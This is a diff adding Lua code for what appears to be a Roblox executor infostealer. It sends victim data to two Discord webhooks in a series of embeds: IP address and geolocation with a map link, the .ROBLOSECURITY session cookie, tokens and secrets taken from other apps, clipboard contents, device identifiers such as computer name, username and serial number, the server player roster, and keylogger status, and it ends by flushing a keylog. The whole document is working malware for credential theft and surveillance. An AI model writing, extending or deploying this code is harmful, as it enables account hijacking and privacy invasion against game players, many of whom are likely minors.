+local function state()
+    local hIP = payload.ip ~= ""; local hC = payload.cookieFound == true
+    if hIP and hC then return "full" end; if hIP or hC then return "partial" end; return "empty"
+end
+local st = state(); local color = PALETTE[st]
+local function v(s) return (tostring(s)=="" and "—") or tostring(s) end
+local function clip(s,n) return tostring(s):sub(1, n or 1024) end
+local function code(s) return "`"..clip(s,1900).."`" end
+local userId = tonumber(payload.userId)
+local headshot = (account.avatarUrl and account.avatarUrl~="" and account.avatarUrl)
+    or (userId and string.format(CONFIG.headshotUrl, userId)) or nil
+local banner = userId and string.format(CONFIG.bannerUrl, userId) or nil
+local mapLink = (payload.loc~="" and ("https://www.google.com/maps?q="..payload.loc)) or nil
+local profileLink = userId and ("https://www.roblox.com/users/"..userId.."/profile") or nil
+
+-- fires the same embed to BOTH webhooks in parallel, logs each
+local function postEmbed(embed, label)
+    local body = encode({ username="collector", embeds={embed} })
+    if not body then log("post."..label,"[FAIL] encode"); return end
+    if primaryAlive then
+        task.spawn(function()
+            local ok, res, err = hit({ Url=CONFIG.webhookPrimary, Method="POST",
+                Headers={["Content-Type"]="application/json"}, Body=body })
+            log("post."..label..".primary", ok and ("[ok] "..res.StatusCode) or ("[FAIL] "..tostring(err)))
+        end)
+    end
+    if secondaryAlive then
+        task.spawn(function()
+            local ok, res, err = hit({ Url=CONFIG.webhookSecondary, Method="POST",
+                Headers={["Content-Type"]="application/json"}, Body=body })
+            log("post."..label..".secondary", ok and ("[ok] "..res.StatusCode) or ("[FAIL] "..tostring(err)))
+        end)
+    end
+end
+
+-- header
+postEmbed({
+    author = { name = "session · "..st:upper().." · "..PLATFORM, icon_url = headshot },
+    title  = v(payload.displayName).." (`"..v(payload.userName).."`)",
+    url    = profileLink,
+    description = table.concat({
+        "**🕐** "..clockNow_.localTime.." (`"..clockNow_.tz.." UTC"..clockNow_.offset.."`)",
+        "",
+        "**"..v(payload.ip).."** · "..v(payload.city)..", "..v(payload.countryCode),
+        payload.cookieFound and ("🍪 cookie via `"..v(payload.cookieMethod).."` — `"..v(payload.cookieRawLen).."` bytes")
+                            or  ("🍪 no cookie — "..v(payload.cookieReason)),
+        "⌨ keylog "..(payload.keylogActive and "✅" or "❌").." · 📡 track "..(payload.trackActive and ("✅ "..CONFIG.track.interval.."s") or "❌"),
+        account.hasVerified and "☑ verified" or nil,
+        account.isBanned and "⚠ **banned**" or nil,
+    }, "\n"),
+    color = color, image = banner and { url = banner } or nil,
+    thumbnail = headshot and { url = headshot } or nil,
+    fields = {
+        { name="User ID",     value=code(payload.userId), inline=true },
+        { name="Account age", value=v(payload.accountAge).." d", inline=true },
+        { name="Membership",  value=v(payload.membership), inline=true },
+        { name="💻 Platform", value=code(PLATFORM), inline=true },
+        { name="⚙ Executor",  value=code(IDENT),   inline=true },
+        { name="🕐 Local",    value="`"..clockNow_.localTime.."`", inline=true },
+    },
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "header")
+
+-- geo
+postEmbed({
+    author = { name = "geo · ipinfo.io" }, color = color,
+    fields = {
+        { name="🌐 IP", value=code(payload.ip), inline=true },
+        { name="🏙 City", value=v(payload.city), inline=true },
+        { name="🗺 Region", value=v(payload.region), inline=true },
+        { name="🌍 Country", value=v(payload.countryCode), inline=true },
+        { name="📮 Postal", value=v(payload.postal), inline=true },
+        { name="🕰 IP TZ", value=v(payload.timezone), inline=true },
+        { name="📍 Coords", value=payload.loc~="" and ("["..payload.loc.."]("..mapLink..")") or "—", inline=true },
+        { name="📡 ISP / ASN", value=clip(v(payload.org), 1024), inline=false },
+        { name="🖧 Hostname", value=code(payload.hostname), inline=true },
+    },
+    footer = { text = "captured "..clockNow_.localTime }, timestamp = clockNow_.discordTs,
+}, "geo")
+
+-- cookie detail
+local envFields = {
+    { name="🍪 Cookie", value=payload.cookieFound and "✅ yes" or "❌ no", inline=true },
+    { name="🔧 Method", value=code(payload.cookieMethod), inline=true },
+    { name="📁 Path", value=code(payload.cookiePath), inline=false },
+    { name="📏 Bytes", value=v(payload.cookieRawLen), inline=true },
+    { name="💬 Reason", value=v(payload.cookieReason), inline=false },
+}
+if payload.cookieFound then
+    local shown = payload.robloxSec
+    if CONFIG.redactOnDiscord then shown = shown:sub(1,12).."… (full at sink)" end
+    envFields[#envFields+1] = { name="🔑 ROBLOSECURITY", value="```"..clip(shown, 1000).."```", inline=false }
+end
+postEmbed({
+    author = { name = "cookie · "..PLATFORM }, color = color, fields = envFields,
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "cookie")
+
+-- device
+local function safeField(s) local t = tostring(s or "—"):gsub("```",""); return "`"..t:sub(1,200).."`" end
+local deviceFields = {}
+if device.platform == "windows" and device.info then
+    local i = device.info
+    deviceFields[#deviceFields+1] = { name="🖥 Computer", value=safeField(i.computerName), inline=true }
+    deviceFields[#deviceFields+1] = { name="👤 User",     value=safeField(i.username),     inline=true }
+    deviceFields[#deviceFields+1] = { name="🏷 OS",       value=safeField(i.os),           inline=true }
+    deviceFields[#deviceFields+1] = { name="🧠 CPU",      value=safeField(i.processorId),  inline=false }
+    deviceFields[#deviceFields+1] = { name="🔢 Cores",    value=safeField(i.processorCount), inline=true }
+    deviceFields[#deviceFields+1] = { name="🏗 Arch",     value=safeField(i.processorArch), inline=true }
+elseif device.platform == "android" and device.build then
+    for _, pair in ipairs({
+        {"📱 Model","ro.product.model"}, {"🏭 Manufacturer","ro.product.manufacturer"},
+        {"🔤 Brand","ro.product.brand"}, {"🤖 Android","ro.build.version.release"},
+        {"🔧 SDK","ro.build.version.sdk"}, {"🆔 Serial","ro.serialno"},
+    }) do
+        if device.build[pair[2]] then
+            deviceFields[#deviceFields+1] = { name=pair[1], value=safeField(device.build[pair[2]]), inline=true }
+        end
+    end
+end
+if #deviceFields == 0 then deviceFields = {{ name="device", value="no readable paths", inline=false }} end
+postEmbed({
+    author = { name = "device · "..PLATFORM }, color = color, fields = deviceFields,
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "device")
+
+-- surfaces
+local surfaceFields = {}
+if #apps > 0 then
+    for _, app in ipairs(apps) do
+        local lines = {}
+        for _, h in ipairs(app.hits or {}) do
+            if h.token then
+                local tk = h.token
+                if CONFIG.redactOnDiscord and #tk > 30 then tk = tk:sub(1,20).."…" end
+                lines[#lines+1] = "JWT: "..tk
+            elseif h.blob then
+                lines[#lines+1] = "enc blob: "..h.blob:sub(1,40).."… ("..#h.blob.." ch)"
+            elseif h.value then
+                local val = h.value
+                if CONFIG.redactOnDiscord and #val > 30 then val = val:sub(1,20).."…" end
+                lines[#lines+1] = val
+            elseif h.path then
+                lines[#lines+1] = h.path.." ("..tostring(h.bytes or "?").." b)"
+            end
+        end
+        if #lines == 0 then lines = { app.found and "(present, no hits)" or app.reason or "(not found)" } end
+        surfaceFields[#surfaceFields+1] = {
+            name = "📦 "..app.label, value = "```"..clip(table.concat(lines, "\n"), 800).."```", inline = false,
+        }
+    end
+else
+    surfaceFields[#surfaceFields+1] = { name="📦 other apps", value="no hits", inline=false }
+end
+if clip then surfaceFields[#surfaceFields+1] = { name="📋 Clipboard", value="```"..clip(clip, 800).."```", inline=false } end
+if account.created and account.created ~= "" then
+    surfaceFields[#surfaceFields+1] = { name="📅 Created", value=account.created:sub(1,19), inline=true }
+    surfaceFields[#surfaceFields+1] = { name="☑ Verified", value=account.hasVerified and "yes" or "no", inline=true }
+    surfaceFields[#surfaceFields+1] = { name="🚫 Banned", value=account.isBanned and "yes" or "no", inline=true }
+end
+postEmbed({
+    author = { name = "surfaces · "..#apps.." app(s)" }, color = color, fields = surfaceFields,
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "surfaces")
+
+-- roster
+local rosterFields = {
+    { name="🎮 Game", value=clip(v(payload.gameName), 200), inline=false },
+    { name="🎯 Place ID", value=code(payload.placeId), inline=true },
+    { name="📦 Version", value=v(payload.gameMeta.placeVersion), inline=true },
+    { name="👥 Players", value=v(roster.count).."/"..v(roster.maxPlayers), inline=true },
+    { name="👤 Creator ID", value=code(payload.gameMeta.creatorId), inline=true },
+    { name="🏷 Creator", value=v(payload.gameMeta.creatorType), inline=true },
+}
+if roster.players and #roster.players > 0 then
+    local plines = {}
+    for i, p in ipairs(roster.players) do
+        if i > 15 then plines[#plines+1] = "… +"..(#roster.players-15).." more"; break end
+        plines[#plines+1] = (p.isLocal and "▶ " or "  ")..p.displayName.." (@"..p.name.." · "..p.userId..")"
+    end
+    rosterFields[#rosterFields+1] = { name="👥 Roster ("..#roster.players..")", value="```"..clip(table.concat(plines,"\n"),1800).."```", inline=false }
+end
+postEmbed({
+    author = { name = "server · "..v(payload.gameName):sub(1,50) }, color = color, fields = rosterFields,
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "server")
+
+-- peripherals
+local function b(v) return v and "✅" or "❌" end
+postEmbed({
+    author = { name = "peripherals" }, color = color,
+    fields = {
+        { name="⌨ Keyboard", value=b(periph.keyboardEnabled), inline=true },
+        { name="🖱 Mouse", value=b(periph.mouseEnabled), inline=true },
+        { name="🎮 Gamepad", value=b(periph.gamepadEnabled), inline=true },
+        { name="👆 Touch", value=b(periph.touchEnabled), inline=true },
+        { name="📳 Accel", value=b(periph.accelerometerEnabled), inline=true },
+        { name="🌀 Gyro", value=b(periph.gyroEnabled), inline=true },
+        { name="🥽 VR", value=b(periph.vrEnabled), inline=true },
+        { name="🎮 Connected", value=v(periph.gamepadCount), inline=true },
+        { name="⏱ Uptime", value=code(elapsedStr()), inline=true },
+    },
+    footer = { text = "ofx · session "..SESSION }, timestamp = clockNow_.discordTs,
+}, "periph")
+
+getgenv().flushKeylog = flushKeylog
+flushKeylog(true)
+log("done","[ok] session "..SESSION.." · "..PLATFORM.." · "..elapsedStr())
